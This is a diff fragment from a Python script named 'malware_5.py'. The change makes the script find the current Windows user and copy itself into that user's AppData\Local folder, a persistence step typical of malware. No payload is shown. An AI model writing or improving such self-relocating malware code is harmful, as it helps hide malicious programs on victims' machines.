@@ -10,7 +10,8 @@ original_src = os.path.abspath(__file__) # get current file path
 source = original_src # store it
 
 def change_dir():
-    dst = os.path.join(r'C:\Users\bibod\AppData\Local', 'malware_5.py') # create a destination
+    user_name = os.getlogin()
+    dst = os.path.join(rf'C:\Users\{user_name}\AppData\Local', 'malware_5.py') # create a destination
     
     # If the script is not already running from the destination directory
     if original_src != dst:
